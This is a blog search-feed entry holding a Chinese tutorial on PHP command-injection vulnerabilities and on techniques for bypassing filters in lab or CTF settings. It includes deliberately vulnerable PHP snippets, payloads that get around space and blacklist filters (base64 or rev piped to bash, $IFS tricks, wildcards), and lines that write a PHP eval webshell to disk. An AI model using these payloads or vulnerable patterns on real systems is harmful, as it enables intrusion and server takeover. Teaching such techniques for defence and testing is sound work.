<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="/2023/07/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/07/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="一、命令执行漏洞原理"><a href="#一、命令执行漏洞原理" class="headerlink" title="一、命令执行漏洞原理"></a>一、命令执行漏洞原理</h1><blockquote><p>在编写程序的时候，当碰到要执行系统命令来获取一些信息时，就要调用外部命令的函数，比如php中的<code>exec()</code>、<code>system()</code>等，如果这些函数的参数是由用户所提供的，那么恶意用户就可能通过构造命令拼接来执行额外系统命令，比如这样的代码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 1 &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>程序的本意是让用户传入一个ip地址去测试网络连通性，但是由于参数不可控，当我们传入的ip参数为”<code>127.0.0.1;id</code>“时，执行的命令就便成了”<code>ping -c 1 127.0.0.1;id</code>“，执行完ping命令后又执行了id命令，”;”在linux中用于将多条命令隔开</p><blockquote><ul><li><code>?ip=127.0.0.1;id</code><br><img src="https://s4.ax1x.com/2022/02/26/bVOLxs.png"></li></ul></blockquote><p>像这样的代码就会存在命令执行漏洞，诸如此类的注入漏洞只要用户输入不可控就可能会存在注入漏洞，至于造成的危害就看执行的什么样的函数</p><hr><h1 id="二、php常用命令执行函数"><a href="#二、php常用命令执行函数" class="headerlink" title="二、php常用命令执行函数"></a>二、php常用命令执行函数</h1><blockquote><p>php中内置了很多执行外部命令的函数，查阅<a href="https://www.php.net/manual/zh/ref.exec.php">php中文手册</a>如下<br><img src="https://s1.ax1x.com/2022/03/08/bcdjSA.png">  </p></blockquote><p>除了用函数执行意外，php还支持命令执行符`&#96;,和shell中的命令替换一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> `命令`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><img src="https://s1.ax1x.com/2022/03/08/bcwKTU.png"></p></blockquote><hr><h1 id="三、常用命令拼接符号"><a href="#三、常用命令拼接符号" class="headerlink" title="三、常用命令拼接符号"></a>三、常用命令拼接符号</h1><h2 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a><em>Windows系统</em></h2><ol><li><p><code>||</code><br> 格式：命令1||命令2…命令n<br> 规则：或运算，如果命令1执行失败，执行命令2，如果命令1执行成功，则不执行命令2<br> 示例：  </p><p>命令1错误，命令2成功执行</p><blockquote><ul><li><code>toert||echo 命令1出错，我执行了！</code><br><img src="/%5B!%5BbZFIZ4.png%5D(https:/s4.ax1x.com/2022/02/26/bZFIZ4.png"></li></ul></blockquote><p>命令1成功，命令2不执行</p><blockquote><ul><li><code>whoami||echo 命令1成功，我未执行！</code><br><img src="https://s4.ax1x.com/2022/02/26/bZFXQK.png"></li></ul></blockquote></li><li><p><code>|</code><br>格式：命令1|命令2…命令n<br>规则：当命令1执行成功时才执行命令2，如果命令1未执行成功则不会执行命令2<br>示例：</p><p> 命令1执行成功，执行命令2</p><blockquote><ul><li><code>whoami|echo ok!</code><br><img src="https://s4.ax1x.com/2022/02/26/bZkvpq.png"></li></ul></blockquote></li><li><p><code>&amp;&amp;</code><br>格式：命令1&amp;&amp;命令2…命令n<br>规则：命令1和命令2一起执行，如果命令1出错命令2则不执行<br>示例：</p><blockquote><ul><li><code>whoami&amp;&amp;echo ok!</code><br><img src="https://s4.ax1x.com/2022/02/26/bZeJIg.png"></li></ul></blockquote></li><li><p><code>&amp;</code><br>格式：命令1&amp;命令2…命令n<br>规则：命令1和命令2一起执行，互不影响<br>示例：</p><blockquote><ul><li><code>whoami&amp;echo ok!</code></li><li><code>whoamid&amp;echo ok!</code><br><img src="https://s4.ax1x.com/2022/02/26/bZe4L6.png"></li></ul></blockquote></li></ol><h2 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a><em>Linux系统</em></h2><blockquote><p>在Linux系统中，其中<code>&quot;||&quot;</code>、<code>&quot;|&quot;</code>、<code>&quot;&amp;&amp;&quot;</code>、拼接符号功能和Windows一样，在shell命令中Linux还定义了一个<code>&quot;;&quot;</code>用于表示语句的结尾，可以将多条shell命令通过<code>&quot;;&quot;</code>隔开</p></blockquote><ol><li><code>;</code><br>格式：命令1;命令2…命令n<br>规则：隔开多条shell命令一起执行<br>示例：<br>通过<code>;</code>执行多条命令<blockquote><ul><li><code>echo &quot;第一条命令&quot;;echo &quot;第二条命令&quot;;echo &quot;第三条命令&quot;</code><br><img src="https://s4.ax1x.com/2022/02/26/bZumiF.png"></li></ul></blockquote></li></ol><h3 id="shell命令替换"><a href="#shell命令替换" class="headerlink" title="shell命令替换"></a><strong>shell命令替换</strong></h3><p>在linux系统中可以使用<code>$()</code>和反引号``来对命令进行替换,这两者的功能一致，只不过进行多条命令内联替换时<code>$()</code>显更为整洁，<strong><strong>在命令注入漏洞中，通过命令替换符号进行巧妙的构造可以绕过一些黑名单</strong></strong><br>示例：  </p><pre><code class="hljs">echo &quot;`id`&quot;</code></pre><blockquote><p><img src="https://s4.ax1x.com/2022/02/26/bZQqfS.png"></p></blockquote><pre><code class="hljs">echo &quot;$(uname -a)&quot;</code></pre><blockquote><p><img src="https://s4.ax1x.com/2022/02/26/bZQzmn.png"></p></blockquote><h1 id="四、命令执行漏洞常用绕过方式（针对Linux内核的系统）"><a href="#四、命令执行漏洞常用绕过方式（针对Linux内核的系统）" class="headerlink" title="四、命令执行漏洞常用绕过方式（针对Linux内核的系统）"></a>四、命令执行漏洞常用绕过方式（针对Linux内核的系统）</h1><blockquote><p>在真实的网络环境中，存在执行系统命令的网页一般都会对用户的输入进行严格的过滤，什么黑名单白名单一堆WAF🐕，下面总结了一些针对检测类型去绕过的方法</p></blockquote><h2 id="0x1-空格绕过"><a href="#0x1-空格绕过" class="headerlink" title="0x1 空格绕过"></a>0x1 空格绕过</h2><ul><li><h3 id="间隔符-quot-IFS-quot"><a href="#间隔符-quot-IFS-quot" class="headerlink" title="间隔符&quot;$IFS&quot;"></a>间隔符<code>&quot;$IFS&quot;</code></h3></li></ul><ol><li><p>简介：<br> $IFS是shell的内置变量，是shell变量中的分隔符，一共有3个值分别是空格<code>&quot; &quot;</code>、制表符<code>&quot;\t&quot;</code>、换行符<code>&quot;\n&quot;</code>，$IFS默认以空格为分隔符，在shell脚本中可以手动设置IFS的值改变默认分隔符，这边通过实验来了解$IFS变量<br> echo打印$IFS的值通过管道符<code>&quot;|&quot;</code>配合xxd以16机制的方式输出$IFS的值（因为$IFS是一些空格、换行、制表不好显示，所以通过xxd以16进制显示）  </p><blockquote><ul><li><code>echo -n &quot;$IFS&quot;|xxd</code><br><img src="https://s4.ax1x.com/2022/02/26/bekZbF.png"><br>xxd用2位表示16进制4位一组显示，如图0x20&#x3D;空格，0x09&#x3D;<code>&quot;\t&quot;</code>，0x0a&#x3D;<code>&quot;\n&quot;</code></li></ul></blockquote><p>默认的IFS分隔符也可以修改成其他符号  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>IFS=<span class="hljs-string">&#x27;;&#x27;</span><br>toert=<span class="hljs-string">&quot;123;456;789&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$toert</span>;<span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><blockquote><p><img src="https://s4.ax1x.com/2022/02/26/beEJtH.png"><br>因为更改了默认分隔符位<code>&quot;;&quot;</code>,所以for读取到<code>&quot;;&quot;</code>处时就跳出循环执行echo然后进入下一论的迭代 </p></blockquote></li><li><p>$IFS方法总结  （目标过滤空格的情况下）</p><blockquote><p>未过滤引号  </p><ul><li><code>命令$IFS&quot;&quot;参数</code></li></ul><p>可以创建自定义变量</p><ul><li><code>a=参数;命令$IFS$a</code></li></ul><p>未过滤”0~9”、”@”、”*”  </p><ul><li><code>命令$IFS$[上述的任意一个数字/字符]参数</code></li></ul><p>未过滤大括号”<code>&#123;&#125;</code>“</p><ul><li><code>命令$&#123;IFS&#125;参数</code></li></ul></blockquote></li><li><p><code>$IFS</code>利用方式原理<br>因为内部变量$IFS默认值为空格，又因为变量的优先级要比命令来的高，所以理想状态应该是命令+$IFS+参数,可以做一个实验尝试一下</p><blockquote><ul><li><code>echo$IFS123</code>（错误用法）<br><img src="https://s4.ax1x.com/2022/02/26/benCeP.png"></li></ul></blockquote><p> 这并不是我们想要的结果，这是因为shell将以<code>$</code>开头的的视为变量的标志，在没有特殊的分隔符情况下往后的都视为变量的名称，所以<code>echo$IFS123</code>返回空的内容，shell没有读取<code>$IFS</code>，而是读取的一个不存在的<code>$IFS132</code>变量，shell允许使用一个不存在的变量，shell将这种变量解析为空值即毫无意义，当然，shell也提供了一个<code>$&#123;&#125;</code>操作符，可以确定变量名的范围，用法如下</p><blockquote><ul><li><code>echo$&#123;IFS&#125;123</code><br><img src="https://s4.ax1x.com/2022/02/26/beKnaV.png"><br> 成功输出123！,用${}将$IFS套起来让shell解析时确定变量的具体名称，这样shell就不会把后面的123也当作变量名了，这类似于python的字符串格式化</li></ul></blockquote><p> ****如果目标服务器过滤了大括号<code>&quot;&#123;&#125;&quot;</code>****，这时<code>$&#123;IFS&#125;</code>就不管用了，再回过头看看第一次尝试的写法<code>echo$IFS123</code>，shell执行命令时看到<code>$</code>号，有没有什么办法让shell读取<code>$</code>后面的内容刚好到S处，经过测试后发现，当shell在搜寻变量名称遇到引号（”）、美元符号($)等符号时就会以这些符号标志结束，也就是说当我们配合<code>$IFS</code>打印一串以字符开头的内容时，输出就会正常</p><blockquote><ul><li><code>echo$IFS&quot;123</code>  </li><li><code>echo$IFS&#39;123</code><br><img src="https://s4.ax1x.com/2022/02/27/bm5sfA.png"></li></ul></blockquote><p> 这边加了转义，因为引号需要闭合，如果将左边的引号闭合会是什么情况  </p><blockquote><ul><li><code>echo$IFS&quot;&quot;123</code><br><img src="/"><br> Linux允许用字引号拼接一个空内容，并且shell因为搜寻到引号字符所以正确解析了$IFS变量，最后正常输出123内容，其实echo$IFS”123”也可以，因为在shell命令获取参数时，参数外面可以用引号括起来也可以不括起来</li></ul></blockquote><p> <strong><strong>如果目标过了引号和大括号怎么办</strong></strong>，顺着刚刚的思路shell解析变量名称碰到<code>&quot;$&quot;</code>就会开始尝试读取下一个变量名，这样的话只要将参数放在一个变量中，然后通过<code>命令+$IFS+变量</code>的方式就可以正常使用<code>$IFS</code>变量，方式如下</p><blockquote><ul><li><code>a=123;echo$IFS$a</code><br><img src="https://s4.ax1x.com/2022/02/27/bnmXz4.png"></li></ul></blockquote><p> 除此之外，还有一种方法，普通shell变量的名称以字符、数字、下划线组成，变量在命名时不能以数字开头也不能以除了<code>&quot;_&quot;</code>以外的字符开头，因为在shell中内置了很多的系统级别的动态变量，这些变量多以数字、字符为名称，而且shell在读取这些变量时因为是内置的所以无需对变量名称范围进行检查，比如其中一个变量$$，这个变量的功能是打印当前程序的pid号，当这个变量后面跟着字符串或者数字时是不会被干扰的，比如</p><blockquote><ul><li><code>echo$IFS$$toert</code><br><img src="https://s4.ax1x.com/2022/02/27/bnYRY9.png"></li></ul></blockquote><p> 可以看到<code>$$</code>变量名并没有像之前那样变成$$toert，值得注意的是shell因为<code>&quot;$$&quot;</code>变量正确解析了<code>$IFS</code>变量，除此之外还有以数字命名系统变量，比如<code>$1</code>，<code>$1</code>变量是shell脚本中用于捕获参数的方法，比如</p><blockquote><p>1.sh<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$1</span><br></code></pre></td></tr></table></figure></p><ul><li><code>chmod +x 1.sh;./1.sh</code><br><img src="https://s4.ax1x.com/2022/02/27/bn0ltO.png"><br> 但是默认情况下$1没有值的，相当于<code>&quot;&quot;</code>,可以做一个实验<br>4.sh     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-keyword">if</span> [<span class="hljs-string">&quot;&quot;</span> == <span class="hljs-variable">$1</span>]<br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\$1 == \&quot;\&quot;&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure></li><li><code>./4.sh</code><br><img src="https://s4.ax1x.com/2022/02/27/bnBm8g.png"><br> $1默认参数等价于””,那上面的<code>echo$IFS&quot;&quot;123</code>不就可以变成<code>echo$IFS$1123</code>了吗，输出结果如下  </li><li><code>echo$IFS$1123</code><br><img src="https://s4.ax1x.com/2022/02/27/bnsp2F.png"><br> 这样也可以绕过空格过滤，像这样默认没有值的内置系统变量还有很多，shell提供了$0~9十个系统变量为脚本提供捕获参数的方法，这些值默认都是空值，相当于<code>&quot;&quot;</code></li></ul></blockquote><table><thead><tr><th>变量名</th><th>作用</th></tr></thead><tbody><tr><td>$0</td><td>表示程序&#x2F;脚本名称</td></tr><tr><td>$1~9</td><td>脚本捕获的9个参数</td></tr><tr><td>$@</td><td>将脚本接受到的参数以列表返回</td></tr><tr><td>$*</td><td>以字符串的方式返回脚本捕获的所有参数</td></tr></tbody></table></li></ol><ul><li><h3 id="大括号-quot-quot"><a href="#大括号-quot-quot" class="headerlink" title="大括号&quot;{}&quot;"></a>大括号<code>&quot;&#123;&#125;&quot;</code></h3><blockquote><p>在bash中”{}”可以当作一个代码块进行执行，命令之间<code>&quot;;&quot;</code>隔开，参数用<code>&quot;,&quot;</code>隔开，但是要注意命令块中不允许有空格</p><ul><li><code>&#123;命令,参数;命令2,参数&#125;</code><br><img src="https://s4.ax1x.com/2022/03/01/bQyETJ.png"></li></ul></blockquote><p>  因为<code>&#123;&#125;</code>中不允许出现空格，如果用了空格就要进行转义，但由于”,”就相当于空格，所以最命令为</p><blockquote><ul><li><code>&#123;echo,\&lt;?php?,eval\(\$_POST[\&#39;id\&#39;]\)\;\&gt;&#125;&gt;mm.php</code><br><img src="https://s4.ax1x.com/2022/03/01/bQ6K4s.png"></li></ul></blockquote></li><li><h3 id="制表符-quot-09-quot"><a href="#制表符-quot-09-quot" class="headerlink" title="制表符&quot;%09&quot;"></a>制表符<code>&quot;%09&quot;</code></h3><blockquote><p>默认制表符为4个空格，shell允许命令和参数之间存在制表符(多个空格)，如</p><ul><li><code>cat[空格][空格][空格][空格]flag.txt</code><br><img src="https://s4.ax1x.com/2022/03/01/bQ66bD.png"></li></ul></blockquote><p>  恰巧php中执行命令的函数也支持命令和参数之间用制表符\t,所以直接通过传入url编码的制表符来过滤空格  </p><blockquote><p><img src="https://s4.ax1x.com/2022/03/01/bQcNsf.png">  </p></blockquote></li><li><h3 id="文件重定向”-lt-lt-gt-“"><a href="#文件重定向”-lt-lt-gt-“" class="headerlink" title="文件重定向”&lt;,&lt;&gt;“"></a>文件重定向”<code>&lt;,&lt;&gt;</code>“</h3><blockquote><p>linux中一切接文件，文件的输入输出通过<code>&quot;&lt;&quot;</code>、<code>&quot;&gt;&quot;</code>、<code>&quot;&gt;&gt;&quot;</code>来操作，通过文件重定向来绕过空格的原理就是文件重定向符号执行优先级大于命令，当shell在解析命令时如果遇到文件重定向符号，首先将执行文件重定向符号，比如cat&lt;1.txt，shell在解析这条命令时因为命令中含有<code>&quot;&lt;&quot;</code>输入重定向，所以shell先执行重定向操作，将cat命令输入重定向到1.txt文件中，即cat命令的输入来自于1.txt文件，最后cat命令在执行时直接输出了1.txt文件的内容</p><ul><li><code>cat&lt;1.txt</code>  </li><li><code>cat&lt;&gt;1.txt</code><br><img src="https://s4.ax1x.com/2022/03/01/bQWYtg.png"></li></ul></blockquote></li></ul><h2 id="0x2-黑名单绕过"><a href="#0x2-黑名单绕过" class="headerlink" title="0x2 黑名单绕过"></a>0x2 黑名单绕过</h2><blockquote><p>有时候目标会对一些关键命令的名称进行过滤，这样的过滤称之为黑名单，可以通过一些拼接和通配符等方法绕过黑名单，当然这些方法对一些笨重的过滤函数来说可行，当遇到正则过滤时就显得有些无力了，下面总结了一些常用绕过黑名单的方法，测试这些方法可以写一个命令执行的网页，然后编写简单的过滤规则</p></blockquote><ul><li><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$cmd</span>,<span class="hljs-string">&quot;黑名单命令&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>).<span class="hljs-string">&quot;&lt;br&gt;you cmd:<span class="hljs-subst">$cmd</span>&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;giaogiaogiao!&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><h3 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h3><p>  将要执行的命令提前进行base64命令编码，然后将编码后的命令通过管道符解码并执行，具体命令如下</p><blockquote><ul><li><code>echo &quot;被过滤的命令&quot;|base64</code></li><li><code>echo base64编码后的命令|base64 -d|shell</code></li><li><code>echo$IFS$1Y2F0IGZsYWcudHh0Cg==|base64$IFS$1-d|bash</code><br><img src="https://s4.ax1x.com/2022/03/01/blMuPs.png"><br><img src="https://s4.ax1x.com/2022/03/02/b32kO1.png"></li></ul></blockquote></li><li><h3 id="shell局部变量绕过"><a href="#shell局部变量绕过" class="headerlink" title="shell局部变量绕过"></a>shell局部变量绕过</h3><p>  在一个shell中定义变量通过<code>名称=值</code>来定义（定义时名称不要加<code>$</code>符号，等号两边不能加空格），查看变量值时可以通过<code>echo $变量名称</code>去查看变量内容，如果直接在命令行中输入变量名称，shell会先解析变量的内容然后将内容当成命令，所以通过将黑名单中过滤的命令名称拆解分成多个变量，然后通过输入变量名称的方式去达到绕过，比如<code>cat flag.txt</code>绕过如下</p><blockquote><ul><li><code>a=c;b=a;c=t;d=.txt;e=ag;f=fl;$a$b$c$IFS$f$e$d</code><br><img src="https://s4.ax1x.com/2022/03/02/b3Dsi9.png"><br><img src="https://s4.ax1x.com/2022/03/02/b3DjeS.png"><br><img src="https://s4.ax1x.com/2022/03/02/b32Qld.png"></li></ul></blockquote></li><li><h3 id="引号、内置变量绕过"><a href="#引号、内置变量绕过" class="headerlink" title="引号、内置变量绕过"></a>引号、内置变量绕过</h3><p>  引号不仅可以配合$IFS绕过空格和也可以绕过一些简单的字符串查找函数，直接在命令名称之间拼接单引号或者双引号来达到绕过，命令如下</p><blockquote><ul><li><code>c&quot;&quot;a&quot;&quot;t$IFS&#39;&#39;flag.txt</code><br><img src="https://s4.ax1x.com/2022/03/02/b3fO9U.png"><br><img src="https://s4.ax1x.com/2022/03/02/b3hQ4f.png"></li></ul></blockquote><p>  之前说过shell内置了一些用于捕获外部参数的变量，如$*、$1~9，这些变量默认情况下等价于””、’’，所以构造这样的命令也可以达到绕过黑名单</p><blockquote><ul><li><code>c$1a$2t$IFS$*flag.txt</code><br><img src="https://s4.ax1x.com/2022/03/02/b35rnJ.png"><br><img src="https://s4.ax1x.com/2022/03/02/b35gtx.png"></li></ul></blockquote></li><li><h3 id="反斜杠绕过”-“"><a href="#反斜杠绕过”-“" class="headerlink" title="反斜杠绕过”\“"></a>反斜杠绕过”\“</h3><p>  在shell中反斜杠除了可以转义特殊字符外还可以将命令分成多行，当命令过长时可以通过反斜杠去跨行输入命令，比如</p><blockquote><p><img src="https://s4.ax1x.com/2022/03/02/b34lZR.png"></p></blockquote><p>  将这些反斜杠全部写在一行中就达到了绕过黑名单的效果</p><blockquote><ul><li><code>c\a\t flag.txt</code><br><img src="https://s4.ax1x.com/2022/03/02/b34qlF.png"><br><img src="https://s4.ax1x.com/2022/03/02/b34oF0.png"></li></ul></blockquote></li><li><h3 id="文件通配符绕过"><a href="#文件通配符绕过" class="headerlink" title="文件通配符绕过"></a>文件通配符绕过</h3><p>  shell支持通配符去匹配文件，<code>&quot;?&quot;</code>代表一个字符，<code>&quot;*&quot;</code>代表多个字符，比如查看当前目录的flag.txt文件，根据描述符可以命令如下</p><blockquote><ul><li><code>cat ????.???</code><br><img src="https://s4.ax1x.com/2022/03/02/b8BmZD.png"></li></ul></blockquote><p>  当然命令也可以通过通配符执行，使用绝对路径的方式去匹配命令，如</p><blockquote><ul><li><code>/bin/c?t ??????t??</code><br><img src="https://s4.ax1x.com/2022/03/02/b8sfYQ.png"></li></ul></blockquote></li><li><h3 id="字符串反序绕过"><a href="#字符串反序绕过" class="headerlink" title="字符串反序绕过"></a>字符串反序绕过</h3><p>  字符串反序绕过黑名单其实和base64编码绕过类似，通过字符串反序将原有的命令打乱然后绕过一些简单的黑名单过滤函数，linux中有一个rev命令，可以将字符串进行反序，我们只要提前将命令进行反序然后二次反序通过管道符配合shell执行，命令如下</p><blockquote><ul><li>提前将要执行的命令反序：<code>echo &quot;cat flag.txt&quot;|rev</code><br><img src="https://s4.ax1x.com/2022/03/03/bJWZcD.png"></li><li><code>echo$IFS$1txt.galf$IFS$1tac|rev|bash</code><br><img src="https://s4.ax1x.com/2022/03/03/bJWB40.png"><br><img src="https://s4.ax1x.com/2022/03/03/bJW7vD.png"></li></ul></blockquote></li><li><h3 id="字符串截取绕过"><a href="#字符串截取绕过" class="headerlink" title="字符串截取绕过"></a>字符串截取绕过</h3><p>  字符串截取绕过原理就是通过截取系统中其他文件的名称或内容，最后拼接绕过黑名单，使用shell的substr命令，通过expr命令执行，<em><strong>通过substr去绕过黑名单条件很苛刻，而且执行的命令较多，一般用于写一句话木马，并且目标过滤了尖括号的情况下使用substr</strong></em>，用例如下</p><blockquote><p>比如黑名单过滤了flag，falg放在了当前的flag.php文件中，通过substr截取flag文件名称绕过黑名单</p><ul><li><code>cat $(expr substr &quot;$(ls)&quot; 1 8)</code><br><img src="https://s4.ax1x.com/2022/03/03/bJxaNV.png"></li></ul></blockquote></li><li><h3 id="内联绕过（命令替换-、-、xargs）"><a href="#内联绕过（命令替换-、-、xargs）" class="headerlink" title="内联绕过（命令替换$()、``、xargs）"></a>内联绕过（命令替换<code>$()</code>、``、xargs）</h3><p>  内联绕过就是通过白名单命令来获取黑名单中截止的字符串，比如黑名单中过滤了”flag”关键字，如果flag在网页根目录下，这时就可以先用<code>ls</code>命令将当前目录中所有文件列出来，然后配合cat进行输出，命令如下</p><blockquote><ul><li><code>cat $(ls)</code>,反引号``和$()效果一样<br><img src="https://s1.ax1x.com/2022/03/08/bceC3d.png"><br>shell解析此命令时因为有变量替换符号，所以先执行ls命令再执行cat命令，最后ls命令就变成了cat命令的参数</li></ul></blockquote><p>  将命令的输出作为另外一个命令的参数，在linux中有专门进行标准输出格式转换的命令<code>xargs</code>，比如上述的命令可以转换为<code>ls|xargs cat</code>，通过管道符获取ls命令的标准输出再通过<code>xargs</code>命令对标准输出格式化为cat命令的参数，如下</p><blockquote><ul><li><code>ls|xargs cat</code><br><img src="https://s1.ax1x.com/2022/03/08/bcmnZ6.png"></li></ul></blockquote></li><li><h3 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h3><p>  有时候目标会限制用户传入的参数长度，比如限制用户传入参数最大长度为5，这时就要通过一些重定向以及创建文件的方式进行绕过，因为不同的过滤规则使用方法不同，后面会根据题目进行简介，这里只是做一个引子</p><blockquote><ul><li>用户最大输入字符长度为5<br><img src="https://s1.ax1x.com/2022/03/08/bcQzL9.png"></li></ul></blockquote></li><li><h3 id="其他查看文件命令绕过"><a href="#其他查看文件命令绕过" class="headerlink" title="其他查看文件命令绕过"></a>其他查看文件命令绕过</h3><p>  shell中内置了很多查看文件内容的命令，如果目标过了了cat命令可以通过其他查看文件命令的方式来绕过  </p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>cat</td><td>查看文件内容</td></tr><tr><td>more、less</td><td>以页方式查看文件内容</td></tr><tr><td>head</td><td>查看文件指定开头行的内容</td></tr><tr><td>tac</td><td>倒着查看文件内容，从最后文件最后一行开始查看</td></tr><tr><td>file -f</td><td>file文件用于查看文件类型，-f参数如果文件内容中有其他文件的名称一起查看，如果没有就报这一行内容未找到，即通过报错的方式查看内容</td></tr><tr><td>rev</td><td>反序查看文件内容</td></tr><tr><td>nl</td><td>查看文件内容并附加行号</td></tr><tr><td>awk NR</td><td>awk流文件编辑器，以流的方式读取文件内容，NR是查看读取到的内容流</td></tr><tr><td>sort</td><td>查看文件内容并去除文件重复的行</td></tr><tr><td>uniq</td><td>查看文件内容去除内容中连续的重复行</td></tr><tr><td>vim、vi</td><td>文本内容编辑</td></tr><tr><td>od</td><td>2机制显示文本内容</td></tr><tr><td>hexdump</td><td>16机制显示文本内容</td></tr><tr><td>xxd</td><td>16机制显示文本内容并默认打印明文</td></tr></tbody></table></li></ul><h2 id="0x3-命令无回显"><a href="#0x3-命令无回显" class="headerlink" title="0x3 命令无回显"></a>0x3 命令无回显</h2><blockquote><p>命令无回显就是在注入恶意命令后web页面并没有该命令的回显，需要我们通过其他方式去验证命令是否成功执行，常见的方式有http隧道、dns隧道、重定向读取、延时查看、nc回显，在线上环境中，http、dsn、nc都需要外网的环境，这里只演示重定向读取和延时查看</p></blockquote><p>环境:<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><ul><li><h3 id="重定向查看"><a href="#重定向查看" class="headerlink" title="重定向查看"></a>重定向查看</h3><p>  如果目标站点可以创建文件，我们可以通过重定向<code>&gt;</code>、<code>&gt;&gt;</code>去将命令的输出重定向到一个文件中，然后再访问这个文件</p><blockquote><ul><li><code>?cmd=ls&gt;1.txt</code><br><img src="https://s1.ax1x.com/2022/03/08/bcJm5R.png"></li></ul></blockquote><p>  然后访问这个1.txt即可得到命令的回显</p><blockquote><p><img src="https://s1.ax1x.com/2022/03/08/bcJHo9.png"></p></blockquote></li><li><h3 id="延时查看"><a href="#延时查看" class="headerlink" title="延时查看"></a>延时查看</h3><p>  和sql延时注入一样，通过判断条件设置页面的回显时间来检查命令是否执行，linux中提供了sleep命令，通过sleep命令配合<code>||</code>命令拼接符去检查命令是否执行，也可以将sleep换成ping命令，将ping包数量设置大一点点，通过F12查看</p><blockquote><ul><li><code>echo &quot;一句话木马&quot; &gt; h.php||sleep 3</code>【成功示例】<br><img src="https://s1.ax1x.com/2022/03/08/bcdP2R.png"></li><li><code>echdo &quot;一句话木马&quot; &gt; h.php||sleep 3</code>【失败示例】<br><img src="https://s1.ax1x.com/2022/03/08/bcaxVU.png"><br><code>||</code>命令拼接符前面有介绍，如果命令1执行成功则不执行命令2，反之执行命令2，也就是说如果写入一句话到文件失败，那么执行sleep函数页面延时回显，这样就可以判断命令是否成功执行</li></ul></blockquote></li></ul><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p><img src="/imgs/image-20230802175827166.png" alt="image-20230802175827166"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
